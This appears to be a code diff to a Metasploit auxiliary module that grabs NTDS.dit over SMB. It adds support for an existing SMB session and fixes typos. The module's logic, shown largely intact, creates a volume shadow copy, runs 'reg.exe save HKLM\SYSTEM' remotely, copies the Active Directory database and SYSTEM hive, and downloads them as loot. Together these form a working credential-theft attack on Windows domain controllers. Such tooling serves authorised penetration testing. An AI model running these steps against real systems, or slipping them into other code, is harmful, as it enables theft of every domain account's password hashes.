@@ -8,6 +8,7 @@ class MetasploitModule < Msf::Auxiliary
   # Exploit mixins should be called first
   include Msf::Exploit::Remote::SMB::Client::Psexec
   include Msf::Auxiliary::Report
+  include Msf::OptionalSession
 
   # Aliases for common classes
   SIMPLE = Rex::Proto::SMB::SimpleClient
@@ -33,7 +34,8 @@ class MetasploitModule < Msf::Auxiliary
       'References' => [
         [ 'URL', 'http://sourceforge.net/projects/smbexec' ],
         [ 'URL', 'https://www.optiv.com/blog/owning-computers-without-shell-access' ]
-      ]
+      ],
+      'SessionTypes' => %w[SMB]
     ))
 
     register_options([
@@ -54,7 +56,13 @@ class MetasploitModule < Msf::Auxiliary
     @ip = datastore['RHOST']
     @smbshare = datastore['SMBSHARE']
     # Try and connect
-    if connect
+    if session
+      print_status("Using existing session #{session.sid}")
+      client = session.client
+      self.simple = ::Rex::Proto::SMB::SimpleClient.new(client.dispatcher.tcp_socket, client: client)
+      @ip = simple.address
+    else
+      return unless connect
       # Try and authenticate with given credentials
       begin
         smb_login
@@ -62,29 +70,30 @@ class MetasploitModule < Msf::Auxiliary
         print_error("Unable to authenticate with given credentials: #{autherror}")
         return
       end
-      # If a VSC was specified then don't try and create one
-      if datastore['VSCPATH'].length > 0
-        print_status("Attempting to copy NTDS.dit from #{datastore['VSCPATH']}")
-        vscpath = datastore['VSCPATH']
-      else
-        unless datastore['CREATE_NEW_VSC']
-          vscpath = check_vss(text, bat)
-        end
-        unless vscpath
-          vscpath = make_volume_shadow_copy(createvsc, text, bat)
-        end
-      end
-      if vscpath
-        if copy_ntds(vscpath, text) and copy_sys_hive
-          download_ntds((datastore['WINPATH'] + "\\Temp\\ntds"))
-          download_sys_hive((datastore['WINPATH'] + "\\Temp\\sys"))
-        else
-          print_error("Failed to find a volume shadow copy.  Issuing cleanup command sequence.")
-        end
-      end
-      cleanup_after(bat, text, "\\#{datastore['WINPATH']}\\Temp\\ntds", "\\#{datastore['WINPATH']}\\Temp\\sys")
-      disconnect
     end
+    # If a VSC was specified then don't try and create one
+    if datastore['VSCPATH'].length > 0
+      print_status("Attempting to copy NTDS.dit from #{datastore['VSCPATH']}")
+      vscpath = datastore['VSCPATH']
+    else
+      unless datastore['CREATE_NEW_VSC']
+        vscpath = check_vss(text, bat)
+      end
+      unless vscpath
+        vscpath = make_volume_shadow_copy(createvsc, text, bat)
+      end
+    end
+
+    if vscpath
+      if copy_ntds(vscpath, text) and copy_sys_hive
+        download_ntds((datastore['WINPATH'] + "\\Temp\\ntds"))
+        download_sys_hive((datastore['WINPATH'] + "\\Temp\\sys"))
+      else
+        print_error("Failed to find a volume shadow copy.  Issuing cleanup command sequence.")
+      end
+    end
+    cleanup_after(bat, text, "\\#{datastore['WINPATH']}\\Temp\\ntds", "\\#{datastore['WINPATH']}\\Temp\\sys")
+    disconnect
   end
 
 
@@ -168,7 +177,7 @@ class MetasploitModule < Msf::Auxiliary
   # Copies the SYSTEM hive file to the Temp directory on the target host
   def copy_sys_hive
     begin
-      # Try to crate the sys hive copy
+      # Try to create the sys hive copy
       command = "%COMSPEC% /C reg.exe save HKLM\\SYSTEM %WINDIR%\\Temp\\sys /y"
       return psexec(command)
     rescue StandardError => hiveerror
@@ -190,7 +199,7 @@ class MetasploitModule < Msf::Auxiliary
       ntds_path = store_loot("psexec.ntdsgrab.ntds", "application/octet-stream", @ip, data, "ntds.dit")
       print_good("ntds.dit stored at #{ntds_path}")
     rescue StandardError => ntdsdownloaderror
-      print_error("Unable to downlaod ntds.dit: #{ntdsdownloaderror}")
+      print_error("Unable to download ntds.dit: #{ntdsdownloaderror}")
       return ntdsdownloaderror
     end
     simple.disconnect("\\\\#{@ip}\\#{@smbshare}")
